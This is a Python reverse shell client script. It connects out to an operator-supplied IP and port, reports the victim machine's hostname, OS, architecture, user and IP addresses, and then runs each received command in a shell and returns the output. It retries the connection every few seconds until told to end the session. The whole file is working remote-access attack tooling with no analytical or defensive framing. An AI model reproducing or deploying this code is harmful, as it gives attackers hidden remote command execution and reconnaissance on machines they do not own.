#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import socket
import platform
from getpass import getuser
from time import time, sleep
from subprocess import Popen
from tempfile import TemporaryFile

def get_input():
    if len(sys.argv) <3 or len(sys.argv) > 4:
        sys.exit('[-] Usage: %s reverse_ip/domain reverse_port [remark]'%(sys.argv[0]))
    try:
        host = socket.gethostbyname(sys.argv[1])
        port = int(sys.argv[2])
        remark = str(sys.argv[3])
    except socket.gaierror:
        sys.exit('[-] reverse_ip/domain %s error'%(sys.argv[1]))
    except ValueError:
        sys.exit('[-] port must be a int number')
    except IndexError:
        remark = ""
    except:
        sys.exit('[-] Usage: %s reverse_ip/domain reverse_port [remark]'%(sys.argv[0]))
    return host, port, remark

def get_host_info(remark, port):
    global TIMEOUT
    hostname = system = ips = user = arch = ""
    try:
        hostname = str(platform.node())
        system = str(platform.platform())
        arch = str(platform.machine())
        user = getuser()
        ips = "  ".join(socket.gethostbyname_ex(socket.gethostname())[2])
    except:
        hostname = "can't get hostname" if hostname == "" else hostname
        system = "can't get platform" if system == "" else system
        arch = "can't get arch" if arch == "" else arch
        user = "can't get user" if user == "" else user
        ips = "can't get ips" if ips == "" else ips
    return "%s---%s---%s---%s---%s---%s---%d---%d"%(hostname, system, arch, user, ips, remark, TIMEOUT, port)

def establish_connection(host, port, host_info):
    global CONN_FLAG
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((host, int(port)))
        CONN_FLAG = 1
        conn.send(str(len(host_info)).zfill(16)+host_info)
        return conn
    except:
        CONN_FLAG = 0
        sleep(5)

def run_command(conn, command):
    global TIMEOUT
    temp_out = TemporaryFile(mode='w+')
    fileno = temp_out.fileno()
    p = Popen(command, shell=True, stdout=fileno, stderr=fileno)
    start_time = time()
    while p.poll() == None:
        if time() > start_time + TIMEOUT:
            temp_out.seek(0)
            result = temp_out.read()
            temp_out.close()
            break
    if 'closed' not in str(temp_out):
        temp_out.seek(0)
        result = temp_out.read()
        temp_out.close()
    conn.send(str(len(result)).zfill(16)+result)

if __name__=="__main__":
    CONN_FLAG = 0
    EXIT_FLAG = 0
    TIMEOUT = 5

    host, port, remark = get_input()
    host_info = get_host_info(remark, port)

    while not EXIT_FLAG:
        conn = establish_connection(host, port, host_info)
        while CONN_FLAG:
            try:
                command = str(conn.recv(1024))
                if command == "killsession()":
                    EXIT_FLAG = 1
                    break
                elif command == "info()":
                    host_info = get_host_info(remark, port)
                    conn.send(str(len(host_info)).zfill(16)+host_info)
                elif command.startswith("set timeout "):
                    try:
                        TIMEOUT = int(command.split()[2])
                        result = "[+] TIMEOUT has been set to %d"%(TIMEOUT)
                    except:
                        result = "[-] set timeout TIMEOUT, TIMEOUT should be an integer number"
                    conn.send(str(len(result)).zfill(16)+result)
                else:
                    run_command(conn, command)
            except:
                break

    conn.close()